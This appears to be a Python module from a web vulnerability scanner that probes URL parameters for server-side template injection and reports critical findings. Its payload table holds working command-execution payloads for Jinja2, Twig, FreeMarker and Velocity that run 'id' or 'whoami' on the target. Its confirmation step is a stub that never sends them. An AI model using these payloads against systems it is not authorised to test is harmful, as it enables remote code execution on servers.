import asyncio
import re
from typing import Dict, List, Optional
from app.core.logger import logger

class SSTIDetector:
    """Server-Side Template Injection detection module"""
    
    def __init__(self, session):
        self.session = session
        self.payloads = {
            'basic': ['${7*7}', '{{7*7}}', '<%= 7*7 %>', '{7*7}'],
            'jinja2': ['{{config}}', '{{7*\'7\'}}', '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}'],
            'twig': ['{{7*7}}', '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'],
            'freemarker': ['${7*7}', '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}'],
            'velocity': ['#set($x=7*7)$x', '$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami")']
        }
    
    async def test_ssti(self, url: str, param: str) -> Optional[Dict]:
        """Test for SSTI vulnerability"""
        # Basic math expression test
        for payload in self.payloads['basic']:
            try:
                test_url = f"{url}?{param}={payload}"
                async with self.session.get(test_url) as resp:
                    content = await resp.text()
                    if '49' in content:  # 7*7 = 49
                        # Confirm with template-specific payloads
                        return await self._confirm_ssti(url, param, content)
            except Exception:
                continue
        return None
    
    async def _confirm_ssti(self, url: str, param: str, content: str) -> Dict:
        """Confirm SSTI with template-specific tests"""
        template_type = self._detect_template_engine(content)
        
        return {
            'type': 'Server-Side Template Injection',
            'severity': 'Critical',
            'description': f'SSTI in parameter: {param}',
            'template_engine': template_type,
            'cvss_score': 9.8,
            'remediation': 'Sanitize user input and use safe template rendering'
        }
    
    def _detect_template_engine(self, content: str) -> str:
        """Detect template engine from response"""
        if 'jinja' in content.lower() or 'flask' in content.lower():
            return 'Jinja2'
        elif 'twig' in content.lower():
            return 'Twig'
        return 'Unknown'